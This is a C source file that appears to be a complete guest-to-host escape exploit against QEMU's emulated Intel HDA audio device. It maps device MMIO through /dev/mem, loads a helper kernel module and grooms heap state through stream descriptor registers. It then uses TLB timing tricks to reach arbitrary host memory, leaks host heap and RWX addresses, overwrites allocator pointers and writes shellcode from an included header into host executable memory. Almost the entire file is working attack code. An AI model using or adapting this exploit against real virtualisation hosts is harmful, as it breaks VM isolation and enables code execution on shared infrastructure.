#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <stddef.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

u64 v2p(void *p)
{
	int fd = open("/proc/self/pagemap", O_RDONLY);
    u64 off = (u64)p/0x1000*8;
    lseek(fd, off, SEEK_SET);
    u64 pfn = 0;
    read(fd, &pfn, 8);
    pfn &= 0x7fffffffffffff;
    close(fd);
    return (pfn << 12) | ((u64)p & 0xfff);
}

void *mmio(u64 pa, u64 sz, u64 fixed)
{
	int fd = open("/dev/mem", O_RDWR|O_SYNC);
	void *p = mmap((void*)fixed, sz, 7, MAP_SHARED|MAP_FIXED, fd, pa);
	close(fd);
	return p;
}

#define HUGEPAGE_SZ (2*1024*1024) 
#define N_TLB_BUSY 0x400

#define ICH6_REG_SD_CTL 0x00
#define ICH6_REG_SD_LVI 0x0c
#define ICH6_REG_SD_BDLPL 0x18
#define ICH6_REG_SD_BDLPU 0x1c

const u64 edid_region = 0xfebf4000;
const u64 edid_vaddr = 0xdead000;
const u64 hda_region = 0xfebf0000;
const u64 hda_vaddr = 0xcafe000;
const u64 data_vaddr = 0xbabe00000;
const u64 huge_vaddr = 0xc0de00000;
const u64 busy_vaddr = 0xbaba00000;
volatile char *hda;
volatile char *edid;
volatile char *data;
volatile char *huge;
volatile char *busy;
u64 data_paddr;
u64 leak;

void wrhda(int idx, int reg, u32 val)
{
	*(u32*)(hda+0x80+0x20*idx+reg) = val;
	__sync_synchronize();
}

void alloc(int idx, int lvi)
{
	wrhda(idx, ICH6_REG_SD_LVI, lvi);
	wrhda(idx, ICH6_REG_SD_CTL, 2);
	wrhda(idx, ICH6_REG_SD_CTL, 0);
}

void prep(int idx, int lvi)
{
	wrhda(idx, ICH6_REG_SD_LVI, lvi);
}

void restore(int idx)
{
	wrhda(idx, ICH6_REG_SD_CTL, 0);
}

#define hothda(idx) (*(volatile u32*)(0xcafe080+0x20*idx) = 2)
#define invhuge() {asm volatile ("invlpg (%%rax)":: "a" (0xc0de00000): "memory");}

#define CPU_FREQ_MHZ 3000ULL
#define spin()  {cycles = CPU_FREQ_MHZ * 100000ULL; \
	__asm__ volatile ( \
        "rdtsc\n\t" \
        "shl $32, %%rdx\n\t" \
        "or %%rdx, %%rax\n\t" \
        "add %0, %%rax\n\t" \
        "mov %%rax, %%rbx\n\t" \
        "1:\n\t" \
        "pause\n\t" \
        "rdtsc\n\t" \
        "shl $32, %%rdx\n\t" \
        "or %%rdx, %%rax\n\t" \
        "cmp %%rbx, %%rax\n\t" \
        "jb 1b" \
        : \
        : "r" (cycles) \
        : "rax", "rbx", "rdx" \
    );}


int devfd;

#define kfunc(addr) ioctl(devfd, 0x1337, addr)
#define set64(idx, off, val) (*(volatile u64*)(data+((idx)*0x2000)+(off)) = (val))

#define CPU_TLB_ENTRY_BITS 5
typedef union CPUTLBEntry {
    struct {
        uint64_t addr_read;
        uint64_t addr_write;
        uint64_t addr_code;
        uintptr_t addend;
    };
    uint64_t addr_idx[(1 << CPU_TLB_ENTRY_BITS) / sizeof(uint64_t)];
} CPUTLBEntry;

typedef enum MMUAccessType {
    MMU_DATA_LOAD  = 0,
    MMU_DATA_STORE = 1,
    MMU_INST_FETCH = 2
#define MMU_ACCESS_COUNT 3
} MMUAccessType;

typedef struct MemTxAttrs {
    unsigned int unspecified:1;
    unsigned int secure:1;
    unsigned int space:2;
    unsigned int user:1;
    unsigned int memory:1;
    unsigned int requester_id:16;
    unsigned int pid:8;
	unsigned int pad1:32;
	unsigned int pad2:2;
} MemTxAttrs;

typedef struct CPUTLBEntryFull {
    u64 xlat_section;
    u64 phys_addr;
    u64 attrs;
    uint8_t prot;
    uint8_t lg_page_size;
    uint8_t tlb_fill_flags;
    uint8_t slow_flags[MMU_ACCESS_COUNT];
    union {
        struct {
            uint8_t pte_attrs;
            uint8_t shareability;
            uint8_t guarded;
			uint8_t pad;
        } arm;
    } extra;
} CPUTLBEntryFull;

void hot0()
{
	hothda(2);
	invhuge();
}

void simmer()
{
	u64 cycles;
	invhuge();
	spin();
}

int redo()
{
	system("sysctl -w vm.nr_hugepages=102400");
	system("sysctl -w vm.mmap_min_addr=0");
	system("insmod kfunc.ko");
	devfd = open("/dev/kfunc", O_RDWR);
	if (devfd < 0) {
		perror("open");
		exit(1);
	}
	edid = mmio(edid_region, 0x1000, edid_vaddr);
	hda = mmio(0xfebf0000, 0x2000, 0xcafe000);
	busy = mmap((void*)busy_vaddr, 0x1000*N_TLB_BUSY, 7,
			 MAP_FIXED|MAP_SHARED|MAP_ANON, -1, 0);
	huge = mmap((void*)huge_vaddr, HUGEPAGE_SZ, PROT_READ|PROT_WRITE,
				   MAP_FIXED|MAP_PRIVATE|MAP_ANON|MAP_HUGETLB, -1, 0);
	data = mmap((void*)data_vaddr, HUGEPAGE_SZ, PROT_READ|PROT_WRITE,
				   MAP_FIXED|MAP_PRIVATE|MAP_ANON|MAP_HUGETLB|MAP_POPULATE, -1, 0);
	data_paddr = v2p(data);
	printf("data: %p\n", (void*)data_paddr);

	for (int i = 0; i < 8; i++)
		wrhda(i, ICH6_REG_SD_BDLPL, data_paddr+i*0x2000);

	set64(5, 0xf8, 0x415);
	set64(1, 0xf8, 0x815);
	alloc(6, 0x10-2);
	alloc(5, 0x10-2);
	alloc(4, 0x10-2);
	alloc(3, 0x10-2);
	alloc(2, 0x10-2);
	alloc(1, 0x10-2);
	alloc(0, 0x10-2);

	set64(6, 0x400, 0x810);


	// very sensitive will have to tweak,
	// basically random but some values
	// will just never work
	//set64(6, 0x408, 0xb5);
	set64(6, 0x408, 0xf5);


	alloc(6, 0x41-2);

	*edid;
	
	huge[0] = 0x69;
	kfunc(simmer);

	huge[0] = 0x69;
	prep(2, 0x1c-2);
	kfunc(hot0);
	restore(2);

	set64(0, 0xf8, 0x115);
	alloc(2, 0x11-2);
	alloc(0, 0x10-2);
	set64(1, 0xf8, 0);

    void *mem = mmap((void*)0x50000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_PRIVATE|MAP_ANON, -1, 0);
	volatile char *target = 0;
	//volatile char *hit = mmio(0, 0x1000, 0x300*0x40000);
	volatile char *hit = mmio(0, 0x1000, 0x7e00000);

	*hit = 0;

	*edid;
	alloc(1, 0x11-2);
	*edid;

	volatile u64 *god = (u64*)target;

	u64 theap = god[157+6]-0x500;
	u64 rwx = god[377+6]-0xd;
	u64 mheap = god[390+6];
	u64 func = mheap+0xecedb8;
	printf("theap = %p\n", theap);
	printf("rwx = %p\n", rwx);
	printf("mheap = %p\n", mheap);
	printf("func = %p\n", func);

	#include "shc.h"

	// tcac 0x1a0
	god[0xa20/8] = func-8;
	// tcac 0x1b0
	god[0xa28/8] = rwx-0x10;

	for (int i = 0; i < shc_len/8; i++)
		set64(0, i*8, ((u64*)shc)[i]);
	alloc(0, 0x1b-2);
	set64(7, 8, rwx);
	alloc(7, 0x1a-2);
	puts("done!");
	*edid;
	return 0;
}


int main(int argc, char **argv)
{
	return redo();
}
